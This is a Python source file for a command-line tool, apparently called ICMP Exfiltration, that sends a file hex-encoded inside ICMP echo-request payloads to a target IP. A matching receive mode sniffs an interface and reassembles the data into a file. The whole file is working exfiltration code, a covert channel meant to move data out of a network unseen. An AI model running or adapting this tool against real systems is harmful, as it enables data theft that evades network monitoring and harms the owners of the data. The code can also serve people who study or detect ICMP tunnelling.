#!/usr/bin/env python3
from scapy.all import *
from colorama import Fore
from tqdm import tqdm
import signal
import subprocess
import sys
import time
import re
import ipaddress
import argparse
from multiprocessing import Process
import netifaces


def ctrl_c(signum, frame):
    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
          f"{Fore.BLUE + '  Exiting the program...'}")
    time.sleep(1)
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Colours
def get_colours(text, color):
    if color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "green":
        red_color = Fore.GREEN + text
        print(red_color)


# Script Banner
def script_banner():
    logo = """
    _____________________  __________     _____________  _______________________________________________________________________   __
____  _/_  ____/__   |/  /__  __ \    ___  ____/_  |/ /__  ____/___  _/__  /___  __/__  __ \__    |__  __/___  _/_  __ \__  | / /
 __  / _  /    __  /|_/ /__  /_/ /    __  __/  __    /__  /_    __  / __  / __  /  __  /_/ /_  /| |_  /   __  / _  / / /_   |/ / 
__/ /  / /___  _  /  / / _  ____/     _  /___  _    | _  __/   __/ /  _  /___  /   _  _, _/_  ___ |  /   __/ /  / /_/ /_  /|  /  
/___/  \____/  /_/  /_/  /_/          /_____/  /_/|_| /_/      /___/  /_____/_/    /_/ |_| /_/  |_/_/    /___/  \____/ /_/ |_/
    """
    owner_name = 'By: Gurpreet ~ Singh (Gurpreet06)'

    print(Fore.YELLOW + logo, end="")
    print('\n\t\t', Fore.BLUE + owner_name)
    print(Fore.WHITE)


def menu_panel():
    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[
        0] + " -i <Adaptor name / IP Address> -m <Mode> -f <Filename>", "green")
    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――",
                'red')
    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-i]'}{Fore.YELLOW + ' Network Adaptor name / IP Address'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-m]'}{Fore.YELLOW + ' Mode to use'}")
    print("")
    get_colours(f"\t send", "blue")
    get_colours(f"\t recv", "blue")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-f]'}{Fore.YELLOW + ' File name to save data or to send.'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.


def data_parser(packet_info):
    if packet_info.haslayer(ICMP):
        if packet_info[ICMP].type == 8 and packet_info[ICMP].id == 12312 and packet_info[Raw].load:
            byte_data = packet_info[Raw].load.decode('utf-8', errors="ignore").replace('\n', '')
            data = bytes.fromhex(byte_data)
            if "FIEOF" in data.decode().strip().rstrip():
                byte_data = str(byte_data).replace("FI", "")
                print(f"\n\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                      f"{Fore.BLUE + '  File received successfully'}")
                exit()
            print(data.decode().strip().rstrip())
            a = open(f'{sys.argv[6]}.txt', 'a')
            a.write(data.decode())
            a.close()


def progressBar(final):
    print()
    for i in tqdm(range(1, final)):
        sys.stdout.write("\033[F")
    print()


def send_file(ip_address, file_name):
    try:
        encodedFile = []
        file = open(file_name, 'rb').readlines()
        for fileData in file:
            encodedFile.append(fileData.decode().encode().hex())
        cnt = len(encodedFile) - 10

        processBar = Process(target=progressBar, args=(cnt,))

        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
              f"{Fore.BLUE + '  Trying to send file..'}")

        processBar.start()
        for encodedData in encodedFile:
            payload = (IP(dst=ip_address, ttl=128) / ICMP(type=8, id=12312) / Raw(load=encodedData))
            sr(payload, timeout=0, verbose=0)
        processBar.join()
        print()
        print(f"\n\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
              f"{Fore.BLUE + '  File sent successfully'}")

        # Send exit msg
        processBar.terminate()
        time.sleep(1)
        exit_text = "FIEOF".encode().hex()
        payload = (IP(dst=ip_address, ttl=128) / ICMP(type=8, id=12312) / Raw(load=exit_text))
        sr(payload, timeout=0, verbose=0)
        print(Fore.WHITE)
    except FileNotFoundError:
        print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
              f"{Fore.RED + ' Indicate file dosent exist, check file name.'}")
        print(Fore.WHITE)  # To avoid leaving the terminal with colours.
        exit()


def checkInterface(arrayInt, userInt):
    if str(userInt) not in arrayInt:
        print(
                f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                f"{Fore.YELLOW + 'Invalid Network Interface name'}")
        return False
    return True


def check_permisson(ip, mode, filename):
    if mode == 'recv':
        if os.getuid() != 0:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
                  f"{Fore.RED + ' Run this script with administrator privileges.'}")
            exit()

        save_all = netifaces.interfaces()
        checkInt = checkInterface(save_all, ip)
        if not checkInt:
            print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
            cnt = 1
            for i in save_all:
                print(
                    f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                cnt = cnt + 1
            exit()
        else:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                  f"{Fore.BLUE + '  Listening for any incoming connections...'}")
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                  f"{Fore.BLUE + '  Saving data to file'}")
            print(Fore.WHITE)  # To avoid leaving the terminal with colors.
            sniff(iface=f'{ip}', prn=data_parser, filter="icmp")
    elif mode == 'send':
        # check for the ip address.
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            print(
                f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                f"{Fore.YELLOW + 'Invalid IP-Address.'}")
            exit()

        scan_host = subprocess.run([f"timeout 1 ping -c 1 {ip}"], stdout=subprocess.PIPE, shell=True)
        split_ttl = str(scan_host).split()
        try:
            get_ttl_size = split_ttl[18]
            ttl_value = re.findall(r"\d{1,3}", get_ttl_size)[0]
            if "returncode=0" in str(scan_host):
                if int(ttl_value) >= 0 and int(ttl_value) <= 64:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                          f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Linux system'}")
                elif int(ttl_value) >= 65 and int(ttl_value) <= 128:
                    print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.BLUE + '*'}{Fore.GREEN + ''}]"
                          f"{Fore.BLUE + '  Hosts active,'} {Fore.YELLOW + ' Windows system'}")
            send_file(ip, filename)
        except IndexError:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + ''}]"
                  f"{Fore.RED + ' Host is not active.'}")


def check_parms():
    if len(sys.argv) > 1:
        # Check for Arguments
        parser = argparse.ArgumentParser()
        parser.add_argument('-i', '--ip', type=str, required=True, help="Network Adaptor name / IP Address")
        parser.add_argument('-m', '--mode', required=True,
                            help='Mode to use send/recv',
                            type=str,
                            )
        parser.add_argument('-f', '--file', required=True,
                            type=str,
                            dest='file',
                            help='File name to save data or to send.',
                            )
        args = parser.parse_args()
        sys.argv[6] = args.file
        if "send" in args.mode or "recv" in args.mode:
            check_permisson(args.ip, args.mode, args.file)  # check for the admin privs
        else:
            print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
                  f"{Fore.YELLOW + 'Select a valid Mode: '}")
            print(f"\n{Fore.RED + '┃'} {Fore.YELLOW + '1. send'}")
            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. recv'}")
            print(Fore.WHITE)
            exit()

    else:
        script_banner()
        menu_panel()


check_parms()
